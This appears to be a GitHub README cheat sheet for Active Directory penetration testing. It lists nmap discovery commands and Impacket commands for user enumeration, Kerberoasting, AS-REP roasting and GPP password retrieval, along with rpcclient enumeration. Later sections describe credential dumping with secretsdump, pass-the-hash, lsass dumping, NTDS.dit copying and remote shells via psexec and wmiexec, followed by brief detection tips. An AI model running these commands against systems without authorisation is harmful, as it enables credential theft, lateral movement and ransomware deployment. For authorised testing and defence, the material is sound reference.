# Ba51c_Activ3_Direct0ry_3numeration
In most engagements regarding Active Directory (Attacktive Directory), credentials are king. This repo contains basic enumeration commands that will help gain more insight into the target network and its identities. 


# IP Discovery Commands
Once connected to the private/internal range of the target, these commands will assist in IP discovery as well as Services that run on the IP. 
- nmap -sn <IP/24>
- nmap -Pn <IP/24>


# Impacket to Rule them All
"What is Impacket used for?
Impacket is an open-source collection of modules written in Python for programmatically constructing and manipulating network protocols."
If credentials have been gained, they will assist with the following commands that can be run in the domain

*Enter details between the placeholders --> ()

## Getting AD Users
python3 GetADUsers.py -all '(domain)/(user):(password)' -dc-ip (IP)

## Kerberoasting 
python3 GetUserSPNs.py test.local/john:password123 -dc-ip 10.10.10.1 -request

## ASREP Roasting
python3 GetNPUsers.py test.local/ -dc-ip 10.10.10.1 -usersfile usernames.txt -format hashcat -outputfile hashes.txt

## Get GPPPassword
python3 Get-GPPPassword.py 'TEST.local/john:password123@DC01.TEST.local' -dc-ip 10.10.10.1


# RPCCLient - Sneaky Enumeration Tactics 
The following tool aids in enumerating objects in a domain without triggering alerts and creating a lot of "noise". 

## RPCClient Authentication
rpcclient -U 'Testuser' 10.10.1.1 - (Password Prompt will appear after)

## RPCClient Commands
- List Users = enumdomusers
- List Groups = enumdomgroups
- Domain Info = querydominfo
- Enumerate all available shares = netshareenumall
- Create Domain User = createdomuser

# Credential harvesting

Once an attacker has obtained an initial foothold in the environment, they can download Impacket directly onto the compromised system or proxy Impacket’s capabilities through an established communication channel, such as Cobalt Strike. The attacker then must harvest valid credentials to move laterally throughout the network and accomplish their end goal. There are many methods that an attacker can use to acquire these passwords, with commonly observed modules listed below. It is important to note that while the output of these modules is compatible with common password cracking tools such as hashcat, the attacker does not need to crack them to authenticate to a remote device. For example, the attacker can perform a pass-the-hash attack and access a device using the acquired NTLM hash.

# Important modules

- GetUserSPNs.py – launches a Kerberoasting attack (note that any domain user in an environment can perform this attack)
- GetNPUsers.py – launches an ASREPoast attack (note that any domain user in an environment can perform this attack)
- secretsdump.py – performs a multitude of techniques to dump secrets from a remote device without deploying any malware there. Data is dumped from the registry and .DIT files that contain hashes, plaintext credentials, and Kerberos keys. An attacker must have local administrator credentials to achieve this.
  
# Hunting tips

Monitor for the RemoteRegistry service entering a running state (event ID 7036) in the Windows System event logs. Extracting credentials enables the RemoteRegistry service on the remote endpoint. While this service is in a stopped state by default, making its activation suspicious, this could also be an artifact of legitimate administrator activity.
Configure a Security Access Control List (SACL) for the HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg registry value. This provides an audit log of all remote access to the Windows registry. Monitor for Attempted Access events (event ID 4663) in the Windows Security log, once turned on for this object.

# Remote execution

Impacket provides several methods for performing remote execution, a methodology Microsoft commonly sees attackers use during ransomware attacks. Attackers can use this capability to launch malware, including broad deployment of ransomware -run commands, or to simply provide them with a shell on the target device. It is important to note that valid credentials are required to establish these connections, although obtaining domain credentials can be relatively simple once an attacker has gained a foothold in the environment. Some common commands, files, and actions Microsoft researchers have seen launched using Impacket are:

- ipconfig /all
- net user and net group to perform domain reconnaissance
- tasklist, often to identify the lsass.exe process for later dumping of memory using comsvcs.dll and rundll32.exe
- echo query user
- sharpweb.exe
- copying of the _NTDS.di_t file with the copy command
- launch of encoded PowerShell commands

# Important modules

- psexec.py creates and subsequently deletes a Windows service on a remote device that creates a semi-interactive shell on a target system using DCOM objects. You can specify a command to run or leave blank to spawn a shell.
- smbexec.py spawns an interactive shell on a target device. This module creates and subsequently deletes a Windows service on a remote device for any command entered into the shell.
- atexec.py creates and subsequently deletes a Scheduled Task on a remote device that launches a command on the target host.
- wmiexec.py creates a semi-interactive shell on a target system using Windows Management Instrumentation. You can specify a command to launch or leave it blank to spawn a shell. This runs as Administrator and does not require installation of any service or agent on the system.
- dcomexec.py creates a semi-interactive shell on a target system using DCOM objects. You can specify a command to launch or leave blank to spawn a shell.




